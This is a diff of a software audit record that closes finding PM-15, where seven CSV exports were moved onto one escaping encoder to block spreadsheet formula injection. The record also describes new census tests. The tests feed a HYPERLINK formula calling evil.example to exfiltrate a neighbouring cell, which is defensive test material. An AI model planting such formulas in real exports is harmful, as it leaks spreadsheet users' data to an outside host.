@@ -827,7 +827,7 @@ No `SET search_path`. The unqualified `org_members` and `auth.uid()` resolve thr
 ## PM-15 · Six other CSV exports write formula-leading cells unescaped — PM-10's guard reached only the project export
 
 - **Severity:** MEDIUM
-- **Status:** OPEN
+- **Status:** RESOLVED
 - **Assigned:** projects J11 PROJECTS RESIDUALS — by the integrator, 2026-10-01 (fleet plan `audit-reports/fleet-plans/`).
 - **Verification:** CONFIRMED (the producers located by `grep -rln 'text/csv' app lib components`; each builds its cells without `lib/csvSafe`)
 - **Locations:** `app/(protected)/admin/audit/page.tsx:450` (audit export), `app/(protected)/register/page.tsx:59-64` → `lib/docControlRegister.ts` `registerToCsv`, `app/(protected)/admin/permissions/page.tsx:209` → `lib/ownership.ts` `ownershipRegisterToCsv`, `app/(protected)/requests/page.tsx:587`, `app/api/knowledge/drawing/route.ts:147`, `components/cockpit/CommandDeck.tsx:342`
@@ -855,5 +855,19 @@ they need nothing.
 **Done when.**
 - Every CSV producer in the repo encodes its cells through `lib/csvSafe`.
 - A census test fails for a new `text/csv` producer that does not import it.
+
+**Resolution (2026-10-01, projects Round G).** Package J11 PROJECTS RESIDUALS (assigned by the integrator; the record's "each adopts it in its own file" owners were not built on this base). Reproduced first: at `55e281d` each of the six producers encoded its cells with its own quoting (`csvField` in `app/(protected)/admin/audit/page.tsx:425` and `components/cockpit/CommandDeck.tsx:282`, a local `csvCell` in `lib/docControlRegister.ts:218` and `lib/ownership.ts:135`, a title-only quote in `app/(protected)/requests/page.tsx:576`, a local `csvCell` in `lib/drawingText.ts:554` behind `/api/knowledge/drawing`'s export), and none neutralised a formula-leading value — the new census fails 7 of its 8 cases against them. A census of the repo found a SEVENTH builder the finding did not list: `lib/notes.ts` `reportToCsv` (the notes report, an exported CSV builder; not called from a page on this base, tested in `notes.test.ts`). Every one now encodes through PM-10's `lib/csvSafe` — no second encoder:
+- `lib/docControlRegister.ts` (`registerToCsv`), `lib/ownership.ts` (`ownershipRegisterToCsv`), `lib/drawingText.ts` (`equipmentRegisterCsv`): the local encoder is deleted and `csvCell` imported.
+- `app/(protected)/admin/audit/page.tsx` (`exportAuditCsv`) and `components/cockpit/CommandDeck.tsx` (`exportInboxCsv`, whose title and section-heading lines now go through it too): `const csvField = csvCell`.
+- `app/(protected)/requests/page.tsx` (`handleExportCSV`): every row and the header through `csvLine` — which also quotes a comma or newline in a requester, unit or drafter name, which the old export did not.
+- `lib/notes.ts` (`reportToCsv`): its `esc` is `csvCell`.
+A change of one encoder in seven files (the done-when asks for every producer; each edit is the substitution and nothing else — `DEC-31`'s "ship those together").
+Tests — new `lib/__tests__/csvProducersCensus.test.ts`: behaviour for each lib builder fed `=HYPERLINK("https://evil.example/?d="&A2,"Open")` and `+ - @` leaders ("the document-control register", "the ownership register", "the drawing equipment register", "the notes report"); and a census over `app/`, `lib/`, `components/` — "finds the seven known producers (and the project export)" (a file that hands a browser `text/csv`, not an `accept=` list or a MIME map), "each producer imports lib/csvSafe, or calls a builder whose module does", "no file but lib/csvSafe.ts hand-rolls a CSV cell encoder (the quote-doubling idiom)", and a source pin on the three page-local exporters. The existing `docControlRegister`, `ownership`, `drawingText`, `notes` and `projectExport` suites pass unchanged.
+
+**Done-when.**
+- Every CSV producer in the repo encodes its cells through `lib/csvSafe` — ✓ (the six named and `reportToCsv`).
+- A census test fails for a new `text/csv` producer that does not import it — ✓ (and for a hand-rolled quote-doubling encoder anywhere outside `lib/csvSafe.ts`).
+
+**Scope / residual.** None. `lib/dataExport.ts` / `lib/exportTables.ts` (JSON) and `lib/xlsxData.ts` (reads) need nothing, as the record says. The `lib/csvSafe.ts` header comment's consumer list is left as J8 wrote it (not this package's file); the census is the live list.
 
 ---
